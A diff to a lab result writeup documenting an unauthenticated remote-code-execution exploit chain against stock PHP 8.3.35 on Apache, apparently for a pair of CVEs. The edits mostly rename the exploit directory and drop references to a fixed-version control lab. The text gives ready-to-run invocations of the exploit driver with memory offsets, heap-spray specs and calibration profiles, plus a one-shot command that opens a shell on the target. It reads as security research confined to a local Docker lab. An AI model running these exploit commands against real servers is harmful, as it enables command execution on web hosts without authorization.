@@ -5,8 +5,7 @@ Command execution as `www-data` on stock `php:8.3.35-apache` (mod_php,
 `php.ini-production`, 128M memory limit) through the pure-HTTP
 CVE-2026-109618/109619 chain, with no plugins, no file writes before RCE,
 and no credentials. 8.3.35 is the last affected 8.3 release, immediately
-before the 8.3.36 fixed-release control in
-[`../lab-8336/RESULT.md`](../lab-8336/RESULT.md).
+before the advisory's 8.3.36 fixed release.
 
 | | |
 |---|---|
@@ -120,7 +119,7 @@ S             = 0x7f0075c00000 + 0xF9398   = 0x7f0075cf9398
   another A1+B1 without an intervening A2/B2 can abort the child
   (`zend_mm_heap corrupted`, SIGABRT). The URL-only driver validates the
   profile by running the first full chain, never a standalone leak.
-- **Driver profile.** `oneshot-8426/exploit.py` now carries
+- **Driver profile.** `oneshot/exploit.py` now carries
   `PROFILES["8.3.35"]`, maps `8.3.35` to it, and includes it in
   `CALIBRATED_BUILDS`. The 8.3.36 gate is unchanged.
 
@@ -131,7 +130,7 @@ Raw chain (local lab):
 ```sh
 ./run.sh
 SPEC=$(python3 -c "print(','.join(['G:300:0xE2']*16+['X:900']))")
-python3 ../oneshot-8426/pure_shell.py \
+python3 ../oneshot/pure_shell.py \
   --host 127.0.0.1 --port 18138 --path /index.php --outdir ./out \
   --zif 0x3ac080 --dtor 0x49ec50 --a1-progress 1000 \
   --b1-fake-len 0xC8000 --b1-spec "$SPEC" --b1-page-off 0x968 \
@@ -143,7 +142,7 @@ URL-only one-shot (only input is the URL; further lines are commands):
 
 ```sh
 printf 'http://127.0.0.1:18138/index.php\nid\nuname -sr\nexit\n' | \
-  P2S_OUTDIR=$PWD/out python3 ../oneshot-8426/exploit.py
+  P2S_OUTDIR=$PWD/out python3 ../oneshot/exploit.py
 ```
 
 Refresh ASLR between chains with `docker restart p2s-8335` (or pass
@@ -157,10 +156,10 @@ Refresh ASLR between chains with `docker restart p2s-8335` (or pass
 - `lab-8335/evidence/image-digest.txt` — image identity
 - `lab-8335/evidence/libphp-sha256.txt` — engine identity (the binary is derived from the recorded image digest and is not committed)
 - `lab-8335/evidence/` — chain logs and extracted proof files
-- `oneshot-8426/exploit.py` — URL-only driver, `PROFILES["8.3.35"]`, banner selection
-- `oneshot-8426/pure_shell.py` — engine (`--s-mode dtor`, `--dtor-anchor`, `--b1-page-off`)
+- `oneshot/exploit.py` — URL-only driver, `PROFILES["8.3.35"]`, banner selection
+- `oneshot/pure_shell.py` — engine (`--s-mode dtor`, `--dtor-anchor`, `--b1-page-off`)
 
-Scope: local Docker lab only. The adjacent fixed-release control is
-`lab-8336/RESULT.md` (8.3.36); 8.2.35 is in `lab-8235/RESULT.md`. The
-8.4.27 and 8.5.12 fixed boundaries are covered by the driver gate but were
-not tested in this repository's labs.
+Scope: local Docker lab only. 8.3.36 is the first fixed 8.3 release and is
+gated by the driver; no dedicated fixed-build negative-control lab is
+included in this repository. The 8.2.35, 8.4.27, and 8.5.12 boundaries are
+likewise gate-only.
